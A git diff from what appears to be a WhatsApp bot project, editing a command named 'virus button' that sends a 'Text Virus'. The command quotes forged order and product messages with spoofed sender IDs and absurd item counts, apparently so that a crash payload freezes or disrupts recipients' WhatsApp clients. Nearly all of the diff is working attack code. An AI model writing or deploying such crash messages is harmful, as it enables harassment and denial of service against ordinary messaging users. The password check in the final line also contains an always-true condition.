@@ -12422,7 +12422,7 @@ message.jid,AAG, MessageType.text, {quoted: { key: { fromMe: false, participant:
 
 Shadow.addCommand({pattern: 'virus button', fromMe: true, desc: 'Send Text Virus'}, (async (message, match) => {
 
-var url = await axios.get(Spark.THUMBNAIL, { responseType: 'arraybuffer' })
+var url = await axios.get(`https://i.imgur.com/40cQtSL.jpeg`, { responseType: 'arraybuffer' })
 
 const buttons = [
         { buttonId: 'VIRUS', buttonText: { displayText: '😌😌😌😌😌😌️' }, type: 1 }
@@ -12435,24 +12435,7 @@ const buttons = [
         headerType: 4,
         imageMessage: imageMessage
     }
-await message.client.sendMessage(message.jid, buttonMessage, MessageType.buttonsMessage, quoted = {
-      key: {
-        fromMe: false,
-        participant: "0@s.whatsapp.net",
-        remoteJid: "status@broadcast"
-      },
-      message: {
-        "orderMessage": {
-        	"itemCount" : 9999999999,
-             "status": 1,
-           "surface" : 1,
-           "message": AAG,
-           "orderTitle": AAG,
-           "thumbnail": Buffer.from(url.data),
-           "sellerJid": '919526808481@s.whatsapp.net' 
-        }
-      }
-    }, contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: AAG,body:AAG,previewType:"PHOTO",sourceUrl:`https://github.com/SPARK-SHADOW/Shadow-Bot`, thumbnail:fs.readFileSync('./uploads/image/Shadow.jpg')}});
+await message.client.sendMessage(message.jid, buttonMessage, MessageType.buttonsMessage, { quoted : { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(message.jid ? { remoteJid: 'status@broadcast' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": Buffer.from(url.data), "title": AAG, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}}, contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: AAG,body:AAG,previewType:"PHOTO",thumbnail:Buffer.from(url.data),sourceUrl:`https://github.com/SPARK-SHADOW/Shadow-Bot`}}})
 }));
 }
 else if (Spark.SHADOWPW !== 'ShAdoW' || Spark.SHADOWPW !== 'SpArK' || Spark.SHADOWPW !== 'Ꮥ н @ ∂ ø Ш') {
